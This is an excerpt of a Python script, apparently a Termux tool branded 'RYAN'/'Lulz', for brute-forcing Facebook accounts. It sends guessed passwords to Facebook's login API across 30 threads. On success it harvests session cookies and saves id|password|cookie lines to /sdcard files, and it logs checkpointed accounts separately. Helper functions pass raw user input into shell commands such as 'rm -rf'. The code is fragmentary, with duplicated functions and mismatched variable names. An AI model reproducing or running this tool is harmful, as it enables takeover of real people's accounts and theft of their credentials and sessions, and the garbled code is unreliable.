...
from concurrent.futures import ThreadPoolExecutor as lukifox
from string import * 
...
sys.stdout.write('\x1b]2; RYAN\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[1;31m Facebook:            Aung Phyo Thant
...
def lukifox():   
    ...
    print(f'\033[1;32m[2] Public ID Crack')
    print(f'\033[1;32m[3] Random Crack ')
    print(f'\033[1;32m[4] Create File')
    print(f'\033[1;32m[5] Login Tool')
    print(f'\033[1;32m[6] Logout Cookie')
    print(f'\033[1;32m[7] Remove Trash Files ')
    print(f'\033[1;32m[8] Separate Ids')
    print(f'\033[1;32m[9] Remove Duplicate IDs')
...
'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);RYAN = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={RYAN};{ckkk}"
...
'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);RYAN = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={RYAN};{ckkk}"
                    print(f"\r{R} [lulz-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/lulz.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/lulz_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [lulz-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/lulz_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Lulz] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Lulz = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Lulz};{ckkk}"
                    print(f"\r{R} [Lulz-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Lulz_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Lulz_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [Lulz-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Lulz] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [Lulz-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Lulz_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with lukifox(max_workers=30) as lukiworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                lukiworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                lukiworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                lukiworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                lukiworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
...
def follower():
    ...
    try:
        ...
        try:
            ...
            menu()
        print(f'File Name To Dump Ids. Example /sdcard/lulz.txt') 
        print(47*"-")
        filepath = input("Put File Name: ")
        os.system('rm -rf %s'%(filepath))
        clear()
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/lulz.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    lulz = input('Put File Name :')
    print(" ")
    luki = input('Saving Put File Name :')
    os.system('touch ' +luki)
    os.system('sort -r '+fox+' | uniq > '+luki)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + lulz )
    print(47*'-')
    print("File Saved To :" + lukifox )
    print(47*'-')
    input(f"{S} Press Enter To Back RYAN Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/lulz.txt\n') 
        filepath = input("Put File Name: ")
...
def cutter():
    ...
    lulz = input('Put File Name:')
    print(" ")
    lukifox = input('Saving Put File Name:')
    os.system('touch ' +lukifox)
    os.system('sort -r '+lulz+' | uniq > '+lukifox)
    os.system('clear')
    print(logo)
    print("Removed Successful From File: " + lulz )
    print("New File Saved:" + lukifox )
    print(47*'-')
    input(f"{S} Press Enter To Back RYAN Menu ")
    lulz(allkey)       
